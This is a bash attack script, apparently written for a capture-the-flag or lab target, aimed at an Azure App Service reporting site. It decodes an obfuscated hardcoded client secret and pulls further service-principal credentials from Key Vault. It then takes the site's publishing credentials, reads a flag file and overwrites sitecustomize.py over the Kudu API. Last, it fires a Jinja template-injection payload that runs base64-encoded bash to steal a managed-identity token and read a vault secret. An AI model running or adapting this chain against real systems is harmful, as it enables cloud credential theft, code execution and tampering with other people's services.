#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-reporting-prod-eus
SITE=app-tbl-reporting-prod
SYNC_ID=58108da8-044e-4d7e-9a46-92e6179b30be
SYNC_SEC=$(printf %s "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)
sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
PVT=$(sp_tok "$SYNC_ID" "$SYNC_SEC" "https://vault.azure.net")
RSJSON=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value')
RS_ID=$(echo "$RSJSON" | jq -r '.appId'); RS_SEC=$(echo "$RSJSON" | jq -r '.clientSecret')
ARM=$(sp_tok "$RS_ID" "$RS_SEC" "https://management.azure.com")
BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
SCM="https://$SITE.scm.azurewebsites.net"
echo "=== read .hv_flag.out ==="
curl -s -u "$KU:$KP" "$SCM/api/vfs/site/wwwroot/.hv_flag.out"
echo
echo "=== neutralize sitecustomize ==="
printf "" > sc.py
curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/sitecustomize.py" -H "If-Match: *" --data-binary @sc.py -o /dev/null -w "PUTSITE=%{http_code}\n"
echo "=== app health ==="
curl -s -o /dev/null -w "HEALTH=%{http_code}\n" "https://$SITE.azurewebsites.net/healthz"
echo "=== SSTI retry (direct) ==="
B=QVQ9JChjdXJsIC1zIC1IICJYLUlERU5USVRZLUhFQURFUjogJElERU5USVRZX0hFQURFUiIgIiRJREVOVElUWV9FTkRQT0lOVD9yZXNvdXJjZT1odHRwczovL3ZhdWx0LmF6dXJlLm5ldCZhcGktdmVyc2lvbj0yMDE5LTA4LTAxJmNsaWVudF9pZD03YTg1MTU2YS0wMWM0LTRlNjEtODQ3Mi00MGE5MjEwNzE1OWIiIHwgcHl0aG9uMyAtYyAiaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgnYWNjZXNzX3Rva2VuJywnJykpIikKY3VybCAtcyAiaHR0cHM6Ly9rdi10Ymwtc2VjLXgzZXVvei52YXVsdC5henVyZS5uZXQvc2VjcmV0cy9mbGFnP2FwaS12ZXJzaW9uPTcuNCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkQVQi
TPL='{{ cycler.__init__.__globals__.os.popen("echo __B__|base64 -d|bash").read() }}'
TPL=${TPL/__B__/$B}
BODY=$(jq -nc --arg t "$TPL" '{template_id:"manifest",template:$t}')
curl -s --max-time 60 -X POST "https://$SITE.azurewebsites.net/api/v1/reports/render" -H "Content-Type: application/json" -d "$BODY" | head -c 4000
echo
echo ALL_DONE
